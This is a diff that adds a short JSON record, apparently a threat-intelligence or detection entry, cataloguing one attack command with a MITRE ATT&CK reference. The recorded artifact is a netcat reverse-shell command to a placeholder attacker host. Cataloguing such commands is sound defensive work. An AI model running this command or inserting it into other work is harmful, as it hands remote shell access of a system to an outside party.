@@ -1,0 +1,7 @@
+{
+  "artifact": "nc -e /bin/sh attacker:4444",
+  "artifact_type": "command",
+  "references": [
+    "https://attack.mitre.org/techniques/T1105/"
+  ]
+}
